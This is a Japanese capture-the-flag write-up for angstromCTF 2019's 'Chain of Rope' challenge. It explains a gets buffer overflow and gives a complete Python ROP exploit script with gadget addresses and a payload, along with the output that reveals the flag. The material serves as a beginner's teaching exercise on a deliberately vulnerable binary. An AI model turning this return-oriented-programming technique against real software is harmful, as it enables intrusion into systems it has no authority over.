# [pwn 80pts] Chain of Rope - angstromCTF 2019
64bitでDEP以外無効です。
```
$ checksec chain_of_rope
[*] 'chain_of_rope'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```

idaで見ると、getsによるオーバーフローがあり、またフラグを読み込んで表示するflag関数があります。
しかし、flag関数では次の条件を満たしていないとフラグを表示してくれません。

- userTokenが0x1337
- balanceが0x4242
- 第一引数が0xba5eba11
- 第二引数が0xbedabb1e

userTokenはauthorize関数を呼ぶことで0x1337にセットできます。
balanceは、authorizeを呼んだ後にaddBalance関数を第一引数0xdeadbeefで呼べば0x4242にセットできます。
したがって、次のようなROPを組み立てればフラグがもらえます。

```python
from ptrlib import *

elf = ELF("./chain_of_rope")
#sock = Process("./chain_of_rope")
sock = Socket("shell.actf.co", 19400)

rop_pop_rdi = 0x00401403
rop_pop_rsi_r15 = 0x00401401

sock.sendline("1")

payload = b'A' * 0x38
payload += p64(elf.symbol("authorize"))
payload += p64(rop_pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(elf.symbol("addBalance"))
payload += p64(rop_pop_rsi_r15)
payload += p64(0xbedabb1e)
payload += p64(0xaaaabbbb)
payload += p64(rop_pop_rdi)
payload += p64(0xba5eba11)
payload += p64(elf.symbol("flag"))
sock.sendline(payload)

sock.interactive()
```

```
$ python solve.py 
[+] Socket: Successfully connected to shell.actf.co:19400
[ptrlib]$ 
--== ROPE CHAIN BLACK MARKET ==--[ptrlib]$ 
LIMITED TIME OFFER: Sending free flag along with any purchase.
What would you like to do?
1 - Set name
2 - Get user info
3 - Grant access
Authenticated to purchase rope chain, sending free flag along with purchase...
actf{dark_web_bargains}
```

ただ、flag関数の中のsystemを呼び出している部分に直接retしてもフラグが出ます。
こういうことができないようにInterKosenCTFに出した問題ではバッファにフラグを読み込む関数とauthフラグを立てる関数と表示する部分を完全に分離しました。（豆知識）

# 感想
ROP初心者向けの問題だと思います。
